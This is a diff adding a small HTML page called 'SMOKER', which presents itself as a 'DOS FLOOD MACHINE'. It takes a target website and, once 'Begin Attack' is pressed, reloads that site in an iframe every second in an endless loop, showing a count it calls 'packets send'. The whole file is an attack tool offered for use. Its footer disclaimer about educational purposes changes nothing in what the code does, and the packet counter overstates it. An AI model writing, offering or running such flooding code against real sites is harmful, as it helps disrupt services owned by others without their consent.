@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>smoker</title>
+    <link rel="stylesheet" href="D_Dos_machine.css">
+</head>
+
+<body>
+    <center>
+        <div class="hed">
+            <h1>SMOKER</h1>
+            <p>DOS FLOOD MACHINE</p>
+        </div>
+        <br>
+            <span>Target Website</span> &nbsp;&nbsp;
+            <input id="input" type="text">
+        <br>
+        <br>
+        
+        <button onclick="atck()">Begin Attack</button>&nbsp; &nbsp;
+        <button onclick="stop()">Refresh page</button>
+        <br>
+        
+        <h1 id="atck_no"></h1>
+        <br>
+        <br>
+
+        <iframe id="over_view" src="" height="450" width="770"></iframe>
+        <footer>
+            <p>Copyright &COPY; 2023 Ravi Kumar. </p>
+               <p> This tool is developed for educational purposes only. Any illegal use of this tool is the sole responsibility of the user.</p>
+        </footer>
+    </center>
+
+    <script>
+        var i = 0;
+        function atck() {
+            var input_val = document.getElementById("input").value;
+            setTimeout(function () {
+                document.getElementById("over_view").src = input_val;
+                document.getElementById("atck_no").innerHTML = i + " packets send";
+                i++;
+                atck();
+            }, 1000)//1000 = 1 sec gap
+			
+            
+        }
+        function stop(){
+            location.reload()
+        }
+
+    </script>
+</body>
+
+</html>
